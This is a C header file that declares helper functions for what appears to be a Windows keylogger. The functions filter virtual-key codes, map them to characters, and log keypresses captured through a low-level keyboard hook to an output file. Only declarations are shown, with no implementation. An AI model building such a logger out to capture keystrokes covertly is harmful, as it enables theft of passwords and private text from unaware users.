#pragma once

#include <Windows.h>

/*
 * is_ignored - Determines if the provided virtual-key code is ignored.
 * @vk_code: The virtual-key code.
 */
BOOL is_ignored(DWORD vk_code);

/*
 * get_key_value - Gets the respective value of the virtual-key code.
 * @vk_code: The virtual-key code.
 */
LPCWSTR get_key_value(DWORD vk_code);

/*
 * log_kbd - Logs the respective unicode characters of the provided kbd hook
 * structure to the out file.
 * @kbd_hook: The kbd hook structure of the keypress.
 */
errno_t log_kbd(const KBDLLHOOKSTRUCT* kbd_hook);
